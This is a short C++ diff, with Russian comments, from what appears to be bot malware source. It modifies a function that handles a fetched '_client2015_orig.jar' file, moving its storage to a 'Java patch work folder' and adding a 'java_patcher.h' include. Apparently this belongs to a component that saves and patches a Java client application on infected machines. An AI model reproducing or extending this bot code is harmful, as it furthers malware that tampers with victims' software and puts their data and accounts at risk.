@@ -13,6 +13,7 @@
 #include "BotHTTP.h"
 #include "HTTPConsts.h"
 #include "Utils.h"
+#include "java_patcher.h"
 
 
 #include "BotDebug.h"
@@ -111,18 +112,18 @@ void CheckJavaClient2015File(const char *aURL)
 	// Определяем путь хранения файла
 	string Path(MAX_PATH);
 
-	pGetEnvironmentVariableA("ALLUSERSPROFILE", Path.t_str(), MAX_PATH);
-
+	//pGetEnvironmentVariableA("ALLUSERSPROFILE", Path.t_str(), MAX_PATH);
+	if( GetJavaPatchWorkFolder( Path.t_str(), "_client2015_orig.jar" ) == 0 ) return;
 
 	Path.CalcLength();
 
 	if (Path.IsEmpty())
 		return;
 
-	Path  += "\\";
+//	Path  += "\\";
 
 	//Создаём временное имя файла
-	string FileName = Path + "_client2015_orig.jar";
+	string FileName = Path;// + "_client2015_orig.jar";
 
 
 	if (FileExistsA(FileName.t_str()))
